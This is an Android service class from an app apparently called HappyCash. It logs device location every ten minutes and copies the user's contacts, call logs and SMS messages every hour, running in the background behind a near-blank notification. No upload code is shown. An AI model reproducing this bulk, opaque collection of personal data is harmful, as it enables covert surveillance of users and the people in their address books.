package com.yinshan.happycash.analytic.collection;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.support.annotation.Nullable;
import android.util.Log;

import com.baidu.location.BDLocation;
import com.yinshan.happycash.analytic.callLog.CallLogDBController;
import com.yinshan.happycash.analytic.contacts.ContactDBController;
import com.yinshan.happycash.analytic.location.LocationContract;
import com.yinshan.happycash.analytic.location.LocationDBController;
import com.yinshan.happycash.analytic.location.LocationRetryPolicy;
import com.yinshan.happycash.analytic.location.LocationTracker;
import com.yinshan.happycash.analytic.sms.SmsDBController;
import com.yinshan.happycash.dao.Location;
import com.yinshan.happycash.utils.DateUtil;

import java.lang.ref.WeakReference;


public class AlyService extends Service implements LocationContract {
    private final static String TAG = "AlyService";
    private final static boolean DEBUG = true;

    private final static int LOCATION_COLLECT_DURATION =  10 * 60 * 1000;
    private final static int LOCATION_RETRY_DURAION = 5 * 1000;             //5S之后重试
    private final static int PHONE_COLLECT_DURATION = 60 * 60 * 1000;

    private LocationTracker mTracker;
    private Collector mCollector;           //位置信息收集器，定义了时间间隔
    private LocationRetryPolicy retryPolicy;
    private Notification notif;

    @Override
    public void onCreate() {
        super.onCreate();
//        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//            startForeground(1, new Notification());
//        }
        if (DEBUG) Log.d(TAG, "onCreate ------ ");
        mTracker = new LocationTracker(this, this,LOCATION_COLLECT_DURATION);
        mCollector = new Collector(this);
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            getNotification();
        }
    }

    private void getNotification() {
        Notification notification;
        String channelID = "1";
        String channelName = "channel_name";
        NotificationChannel channel = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            channel = new NotificationChannel(channelID, channelName, NotificationManager.IMPORTANCE_HIGH);
            NotificationManager manager = (NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
            manager.createNotificationChannel(channel);
            Notification.Builder builder =new Notification.Builder(this);
            builder.setContentText("xxx");
            builder.setContentTitle("");
            builder.setChannelId(channelID);
            notification =builder.build();
            startForeground(1,notification);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (DEBUG) Log.d(TAG, "onStartCommand -------- "+startId);
        if (retryPolicy == null) {
            retryPolicy = new LocationRetryPolicy();
        }
        mCollector.resume();
        return START_STICKY;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        mTracker.destroy();
        mCollector.pause();
        super.onDestroy();
    }

    @Override
    public void onReceived(Location bdLocation) {
        if (DEBUG) Log.d(TAG, "location :"
                + "LocType = " + bdLocation.getLocType()
                + ", longitude = " + bdLocation.getLongitude()
                + ", latitude = " + bdLocation.getLatitude()
                + ", altitude = " + bdLocation.getAltitude()
                + ", time = " + bdLocation.getDateTime());
//        FileUtil.writeLog(this, "location :"
//                + "LocType = " + bdLocation.getLocType()
//                + ", longitude = " + bdLocation.getLongitude()
//                + ", latitude = " + bdLocation.getLatitude()
//                + ", altitude = " + bdLocation.getAltitude()
//                + ", time = " + bdLocation.getTime());
//        Location location = new Location();
//        location.setLocType(bdLocation.getLocType());
        if (bdLocation.getLocType() == BDLocation.TypeGpsLocation ||
                bdLocation.getLocType() == BDLocation.TypeNetWorkLocation ||
                bdLocation.getLocType() == BDLocation.TypeOffLineLocation ||
                bdLocation.getLocType()==LocationTracker.GPS_TYPE) {
//            location.setLongitude(bdLocation.getLongitude());
//            location.setLatitude(bdLocation.getLatitude());
        } else if (bdLocation.getLocType() == BDLocation.TypeServerError) {
            //try again
            if (retryPolicy.hasAttemptRemaining()) {
                retryPolicy.retry();
                mCollector.forceLocation();
            }
        } else {
            bdLocation.setLongitude(0.0);
            bdLocation.setLatitude(0.0);
        }
        //location.setAltitude(0.0);
        LocationDBController.getInstance().insert(bdLocation);

//        if (AppReport.defaultPolicy == AlyContract.ReportPolicy.REALTIME) {
//            AlyManager.getInstance().sendLocationData();
//        }
    }

    private void updateGpsState(int state) {
        Location location = new Location();
        location.setLocType(state);
        location.setLongitude(0.0);
        location.setLatitude(0.0);
        location.setAltitude(0.0);
        location.setDateTime(DateUtil.now());
        LocationDBController.getInstance().insert(location);
    }

    private void gainPhoneData() {
        ContactDBController.getInstance().gainContacts();
        CallLogDBController.getInstance().gainCallLogs();
        SmsDBController.getInstance().gainMessages();
    }

    private class Collector extends Handler {
        public final static int MESSAGE_CODE_LOCATION = 0;
        public final static int MESSAGE_CODE_PHONE = 1;

        private final WeakReference<AlyService> mService;

        public Collector(AlyService service) {
            mService = new WeakReference<AlyService>(service);
        }

        @Override
        public void handleMessage(Message msg) {
            AlyService service = mService.get();
            if (service == null) {
                return;
            }
            switch (msg.what) {
                case MESSAGE_CODE_LOCATION:
                    LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
                    if (!locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        //gps is disabled
                        updateGpsState(LocationContract.GPS_DISABLED);
                    } else {
                        mTracker.start();
                    }
                    sendEmptyMessageDelayed(MESSAGE_CODE_LOCATION, LOCATION_COLLECT_DURATION);
                    break;
                case MESSAGE_CODE_PHONE:
                    gainPhoneData();
                    sendEmptyMessageDelayed(MESSAGE_CODE_PHONE, PHONE_COLLECT_DURATION);
                    break;
            }

        }

        void forceLocation() {
//            if (hasMessages(MESSAGE_CODE_LOCATION)) {
//                removeMessages(MESSAGE_CODE_LOCATION);
//            }
            sendEmptyMessageDelayed(MESSAGE_CODE_LOCATION, LOCATION_RETRY_DURAION);
        }

        void resume() {
            if (!hasMessages(MESSAGE_CODE_LOCATION)) {
                sendEmptyMessage(MESSAGE_CODE_LOCATION);
            }

            if (!hasMessages(MESSAGE_CODE_PHONE)) {
                sendEmptyMessageDelayed(MESSAGE_CODE_PHONE, 1000);
            }
        }

        void pause() {
            removeMessages(MESSAGE_CODE_LOCATION);
            removeMessages(MESSAGE_CODE_PHONE);
        }
    }
}
